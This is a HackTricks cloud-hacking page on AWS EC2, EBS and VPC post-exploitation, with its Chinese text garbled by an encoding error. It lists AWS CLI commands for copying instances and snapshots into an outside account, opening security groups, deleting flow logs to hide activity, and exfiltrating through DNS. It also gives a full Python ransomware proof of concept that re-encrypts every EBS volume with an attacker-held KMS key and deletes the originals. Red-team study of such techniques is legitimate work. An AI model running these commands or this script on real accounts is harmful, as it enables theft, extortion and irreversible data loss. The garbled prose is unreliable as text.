# AWS - EC2ã€EBSã€SSM å’Œ VPC åæ¸—é€

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## EC2 å’Œ VPC

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **æ¶æ„ VPC é•œåƒ -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC æµé‡é•œåƒ**å¤åˆ¶ VPC å†… EC2 å®ä¾‹çš„å…¥ç«™å’Œå‡ºç«™æµé‡**ï¼Œæ— éœ€åœ¨å®ä¾‹æœ¬èº«ä¸Šå®‰è£…ä»»ä½•ä¸œè¥¿ã€‚è¿™ä¸ªå¤åˆ¶çš„æµé‡é€šå¸¸ä¼šè¢«å‘é€åˆ°ç±»ä¼¼ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS) è¿›è¡Œåˆ†æå’Œç›‘æ§ã€‚\
æ”»å‡»è€…å¯ä»¥æ»¥ç”¨è¿™ä¸€ç‚¹æ¥æ•è·æ‰€æœ‰æµé‡å¹¶ä»ä¸­è·å–æ•æ„Ÿä¿¡æ¯ï¼š

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹æ­¤é¡µé¢ï¼š

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### å¤åˆ¶è¿è¡Œä¸­çš„å®ä¾‹

å®ä¾‹é€šå¸¸åŒ…å«æŸç§æ•æ„Ÿä¿¡æ¯ã€‚æœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥è¿›å…¥ï¼ˆæŸ¥çœ‹ [EC2 æƒé™æå‡æŠ€å·§](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)ï¼‰ã€‚ç„¶è€Œï¼Œå¦ä¸€ç§æ£€æŸ¥å®ƒåŒ…å«ä»€ä¹ˆçš„æ–¹æ³•æ˜¯**åˆ›å»ºä¸€ä¸ª AMI å¹¶ä»ä¸­è¿è¡Œä¸€ä¸ªæ–°å®ä¾‹ï¼ˆç”šè‡³åœ¨æ‚¨è‡ªå·±çš„è´¦æˆ·ä¸­ï¼‰**ï¼š
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS å¿«ç…§è½¬å‚¨

**å¿«ç…§æ˜¯å·çš„å¤‡ä»½**ï¼Œé€šå¸¸ä¼šåŒ…å«**æ•æ„Ÿä¿¡æ¯**ï¼Œå› æ­¤æ£€æŸ¥å®ƒä»¬åº”è¯¥ä¼šæ³„éœ²è¿™äº›ä¿¡æ¯ã€‚\
å¦‚æœä½ å‘ç°ä¸€ä¸ª**æ²¡æœ‰å¿«ç…§çš„å·**ï¼Œä½ å¯ä»¥ï¼š**åˆ›å»ºä¸€ä¸ªå¿«ç…§**å¹¶æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼Œæˆ–è€…åªæ˜¯**åœ¨è´¦æˆ·å†…çš„å®ä¾‹ä¸­æŒ‚è½½å®ƒ**ï¼š

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### æ•°æ®æ¸—é€

#### DNS æ¸—é€

å³ä½¿ä½ é”å®šäº† EC2 ä½¿å¾—æ²¡æœ‰æµé‡å¯ä»¥å‡ºå»ï¼Œå®ƒä»ç„¶å¯ä»¥é€šè¿‡ DNS **æ¸—é€**ã€‚

* **VPC æµæ—¥å¿—ä¸ä¼šè®°å½•è¿™ä¸ª**ã€‚
* ä½ æ— æ³•è®¿é—® AWS DNS æ—¥å¿—ã€‚
*   é€šè¿‡å°† "enableDnsSupport" è®¾ç½®ä¸º false æ¥ç¦ç”¨æ­¤åŠŸèƒ½ï¼š

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### é€šè¿‡ API è°ƒç”¨æ¸—é€

æ”»å‡»è€…å¯ä»¥è°ƒç”¨ä»–æ§åˆ¶çš„è´¦æˆ·çš„ API ç«¯ç‚¹ã€‚Cloudtrail å°†è®°å½•è¿™äº›è°ƒç”¨ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿåœ¨ Cloudtrail æ—¥å¿—ä¸­çœ‹åˆ°æ¸—é€çš„æ•°æ®ã€‚

### å¼€æ”¾å®‰å…¨ç»„

ä½ å¯ä»¥é€šè¿‡åƒè¿™æ ·æ‰“å¼€ç«¯å£æ¥è¿›ä¸€æ­¥è®¿é—®ç½‘ç»œæœåŠ¡ï¼š

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### æå‡è‡³ECSæƒé™

å¯ä»¥è¿è¡Œä¸€ä¸ªEC2å®ä¾‹å¹¶æ³¨å†Œå®ƒä»¥ç”¨äºè¿è¡ŒECSå®ä¾‹ï¼Œç„¶åçªƒå–ECSå®ä¾‹çš„æ•°æ®ã€‚

æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤å¤„**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)ã€‚

### ç§»é™¤VPCæµæ—¥å¿—
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### åˆ†äº« AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### åˆ†äº« EBS å¿«ç…§

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
```markdown
### EBS å‹’ç´¢è½¯ä»¶æ¦‚å¿µéªŒè¯

ä¸€ä¸ªç±»ä¼¼äºåœ¨ S3 åæ¸—é€ç¬”è®°ä¸­æ¼”ç¤ºçš„å‹’ç´¢è½¯ä»¶æ¼”ç¤ºçš„æ¦‚å¿µéªŒè¯ã€‚è€ƒè™‘åˆ°ä½¿ç”¨ KMS åŠ å¯†å„ç§ AWS æœåŠ¡çš„ä¾¿åˆ©æ€§ï¼Œåº”è¯¥å°† KMS é‡å‘½åä¸º RMSï¼ˆå‹’ç´¢è½¯ä»¶ç®¡ç†æœåŠ¡ï¼‰ã€‚

é¦–å…ˆï¼Œä»ä¸€ä¸ªâ€œæ”»å‡»è€…â€AWS è´¦æˆ·ä¸­ï¼Œåœ¨ KMS ä¸­åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç®¡ç†çš„å¯†é’¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†è®© AWS ä¸ºæˆ‘ç®¡ç†å¯†é’¥æ•°æ®ï¼Œä½†åœ¨ç°å®æƒ…å†µä¸‹ï¼Œæ¶æ„è¡Œä¸ºè€…ä¼šä¿ç•™åœ¨ AWS æ§åˆ¶ä¹‹å¤–çš„å¯†é’¥æ•°æ®ã€‚æ›´æ”¹å¯†é’¥ç­–ç•¥ï¼Œå…è®¸ä»»ä½• AWS è´¦æˆ·ä¸»ä½“ä½¿ç”¨è¯¥å¯†é’¥ã€‚å¯¹äºè¿™ä¸ªå¯†é’¥ç­–ç•¥ï¼Œè´¦æˆ·åä¸º 'AttackSim'ï¼Œå…è®¸æ‰€æœ‰è®¿é—®çš„ç­–ç•¥è§„åˆ™ç§°ä¸º 'Outside Encryption'
```
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
å¯†é’¥ç­–ç•¥è§„åˆ™éœ€è¦å¯ç”¨ä»¥ä¸‹åŠŸèƒ½ï¼Œä»¥å…è®¸ä½¿ç”¨å®ƒæ¥åŠ å¯†EBSå·ï¼š

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰äº†å¯å…¬å¼€è®¿é—®çš„å¯†é’¥ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªâ€œå—å®³è€…â€è´¦æˆ·ï¼Œè¯¥è´¦æˆ·å·²ç»å¯åŠ¨äº†ä¸€äº›å¸¦æœ‰æœªåŠ å¯†EBSå·çš„EC2å®ä¾‹ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åŠ å¯†è¿™ä¸ªâ€œå—å®³è€…â€è´¦æˆ·çš„EBSå·ï¼Œè¿™ç§æ”»å‡»æ˜¯åœ¨å‡è®¾é«˜æƒé™AWSè´¦æˆ·è¢«æ³„éœ²çš„æƒ…å†µä¸‹è¿›è¡Œçš„ã€‚

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

ç±»ä¼¼äºS3å‹’ç´¢è½¯ä»¶ç¤ºä¾‹ã€‚è¿™ç§æ”»å‡»å°†é€šè¿‡å¿«ç…§åˆ›å»ºé™„åŠ EBSå·çš„å‰¯æœ¬ï¼Œä½¿ç”¨â€œæ”»å‡»è€…â€è´¦æˆ·ä¸­å…¬å¼€å¯ç”¨çš„å¯†é’¥åŠ å¯†æ–°çš„EBSå·ï¼Œç„¶åä»EC2å®ä¾‹ä¸­åˆ†ç¦»åŸå§‹EBSå·å¹¶åˆ é™¤å®ƒä»¬ï¼Œæœ€ååˆ é™¤ç”¨äºåˆ›å»ºæ–°åŠ å¯†EBSå·çš„å¿«ç…§ã€‚ ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

è¿™å¯¼è‡´è´¦æˆ·ä¸­åªå‰©ä¸‹åŠ å¯†çš„EBSå·ã€‚

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

åŒæ ·å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè„šæœ¬åœæ­¢äº†EC2å®ä¾‹ä»¥åˆ†ç¦»å’Œåˆ é™¤åŸå§‹EBSå·ã€‚åŸå§‹æœªåŠ å¯†çš„å·ç°åœ¨å·²ç»æ¶ˆå¤±äº†ã€‚

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

æ¥ä¸‹æ¥ï¼Œè¿”å›åˆ°â€œæ”»å‡»è€…â€è´¦æˆ·çš„å¯†é’¥ç­–ç•¥ä¸­ï¼Œä»å¯†é’¥ç­–ç•¥ä¸­ç§»é™¤â€œå¤–éƒ¨åŠ å¯†â€ç­–ç•¥è§„åˆ™ã€‚
```{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
è¯·ç¨ç­‰æ–°è®¾ç½®çš„å¯†é’¥ç­–ç•¥ä¼ æ’­ã€‚ç„¶åè¿”å›åˆ°â€œå—å®³è€…â€è´¦æˆ·ï¼Œå°è¯•è¿æ¥å…¶ä¸­ä¸€ä¸ªæ–°åŠ å¯†çš„EBSå·ã€‚ä½ ä¼šå‘ç°ä½ å¯ä»¥è¿æ¥è¯¥å·ã€‚

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

ä½†æ˜¯å½“ä½ å°è¯•å®é™…å¯åŠ¨å¸¦æœ‰åŠ å¯†EBSå·çš„EC2å®ä¾‹æ—¶ï¼Œå®ƒä¼šå¤±è´¥å¹¶ä¸”ä»â€œç­‰å¾…â€çŠ¶æ€æ°¸è¿œå›åˆ°â€œåœæ­¢â€çŠ¶æ€ï¼Œå› ä¸ºé™„åŠ çš„EBSå·æ— æ³•ä½¿ç”¨å¯†é’¥è§£å¯†ï¼Œå› ä¸ºå¯†é’¥ç­–ç•¥ä¸å†å…è®¸å®ƒã€‚

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

è¿™æ˜¯ä½¿ç”¨çš„pythonè„šæœ¬ã€‚å®ƒéœ€è¦â€œå—å®³è€…â€è´¦æˆ·çš„AWSå‡­è¯å’Œä¸€ä¸ªå…¬å¼€å¯ç”¨çš„AWS ARNå€¼ï¼Œç”¨äºåŠ å¯†ã€‚è¯¥è„šæœ¬å°†åˆ¶ä½œç›®æ ‡AWSè´¦æˆ·ä¸­æ‰€æœ‰EC2å®ä¾‹é™„åŠ çš„æ‰€æœ‰å¯ç”¨EBSå·çš„åŠ å¯†å‰¯æœ¬ï¼Œç„¶ååœæ­¢æ¯ä¸ªEC2å®ä¾‹ï¼Œåˆ†ç¦»åŸå§‹EBSå·ï¼Œåˆ é™¤å®ƒä»¬ï¼Œå¹¶æœ€ç»ˆåˆ é™¤åœ¨æ­¤è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ‰€æœ‰å¿«ç…§ã€‚è¿™å°†åªç•™ä¸‹åŠ å¯†çš„EBSå·åœ¨ç›®æ ‡â€œå—å®³è€…â€è´¦æˆ·ä¸­ã€‚ä»…åœ¨æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨æ­¤è„šæœ¬ï¼Œå®ƒæ˜¯ç ´åæ€§çš„ï¼Œå¹¶å°†åˆ é™¤æ‰€æœ‰åŸå§‹EBSå·ã€‚ä½ å¯ä»¥ä½¿ç”¨æ‰€ä½¿ç”¨çš„KMSå¯†é’¥æ¢å¤å®ƒä»¬ï¼Œå¹¶é€šè¿‡å¿«ç…§å°†å®ƒä»¬æ¢å¤åˆ°åŸå§‹çŠ¶æ€ï¼Œä½†æ˜¯æƒ³è®©ä½ çŸ¥é“ï¼Œè¿™ç»ˆç©¶æ˜¯ä¸€ä¸ªå‹’ç´¢è½¯ä»¶çš„æ¦‚å¿µéªŒè¯ã€‚
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
